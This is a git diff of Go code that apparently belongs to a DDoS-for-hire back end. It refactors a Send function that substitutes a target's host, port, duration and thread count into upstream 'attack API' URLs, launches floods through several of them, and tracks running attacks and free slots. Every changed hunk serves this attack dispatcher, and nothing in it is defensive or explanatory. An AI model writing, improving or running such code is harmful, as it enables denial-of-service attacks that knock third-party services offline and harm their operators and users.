@@ -5,7 +5,7 @@ import (
 	"api/core/models/floods"
 	"fmt"
 	"math"
-
+	"sort"  
 	"net/http"
 	"api/core/models/log"
 	"strings"
@@ -44,7 +44,7 @@ func trackAttack(api *Api, attack *floods.Attack) {
 	<-time.After(duration)
 	api.running--
 	delete(ongoingAttacks, attack)
-	log.Printf("Attack on API %s finished.\n", api.Name)
+	log.Printf("Attack on API %s finished.", api.Name)
 }
 
 // Slots returns the total available slots across all APIs
@@ -75,42 +75,60 @@ func Slots4() int {
 	return totalSlots4
 }
 
-func Send(a *floods.Attack) error {
-	terms := strings.NewReplacer("$host", a.Target,
-		"$port", fmt.Sprint(a.Port),
-		"$time", fmt.Sprint(a.Duration),
-		"$threads", fmt.Sprint(a.Threads),
-	)
-	for _, api := range Apis {
-		c := http.DefaultClient
-		method, ok := api.Methods[a.Method.Sname]
-		if !ok {
-			return fmt.Errorf("skipping APIs trying servers...")
-		}
-		url := terms.Replace(api.URL)
-		url = strings.ReplaceAll(url, "$method", method)
-		fmt.Println(url, a.Method.Sname)
-		resp, err := c.Get(url)
-		if err != nil {
-			return fmt.Errorf("error sending attack via API %s: %v", api.Name, err)
-		}
-		if resp.StatusCode == 200 {
-			log.Println("successfully sent attack using " + api.Name)
-			api.running++
-			go trackAttack(api, a)
-			continue
-		} else if resp.StatusCode == 404 {
-			log.Println("successfully sent attack using " + api.Name)
-			api.running++
-			go trackAttack(api, a)
-			continue
-		} else {
-			return fmt.Errorf("error occurred while sending attack using %s: StatusCode %d", api.Name, resp.StatusCode)
-		}
-		
-	}
-	return nil
+func Send(atk *floods.Attack, count int) (int, error) {
+    var (
+        sent    int
+        lastErr error
+    )
+    // build a stable slice of keys
+    keys := make([]string, 0, len(Apis))
+    for k := range Apis {
+        keys = append(keys, k)
+    }
+    sort.Strings(keys)
+
+    terms := strings.NewReplacer(
+        "$host",    atk.Target,
+        "$port",    fmt.Sprint(atk.Port),
+        "$time",    fmt.Sprint(atk.Duration),
+        "$threads", fmt.Sprint(atk.Threads),
+    )
+
+    for _, name := range keys {
+        if sent >= count {
+            break
+        }
+        api := Apis[name]
+        method, ok := api.Methods[atk.Method.DisplayName]
+        if !ok {
+            continue
+        }
+
+        url := terms.Replace(api.URL)
+        url = strings.ReplaceAll(url, "$method", method)
+		log.Printf("Calling API %s → %s", api.Name, url)
+        resp, err := http.DefaultClient.Get(url)
+        if err != nil {
+            lastErr = err
+            continue
+        }
+        resp.Body.Close()
+
+        if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNotFound {
+            api.running++
+            go trackAttack(api, atk)
+            sent++
+        } else {
+            lastErr = fmt.Errorf("API %s status %d", api.Name, resp.StatusCode)
+        }
+    }
+
+    if sent == 0 && lastErr != nil {
+        return 0, lastErr
+    }
+    return sent, nil
 }
+
 func (api *Api) Load() float64 {
 	log.Println(api.Name, api.running, api.Slots, fmt.Sprintf("%.2f", (float64(api.running)/float64(api.Slots))*100))
 	return toFixed(((float64(api.running) / float64(api.Slots)) * 100), 2)
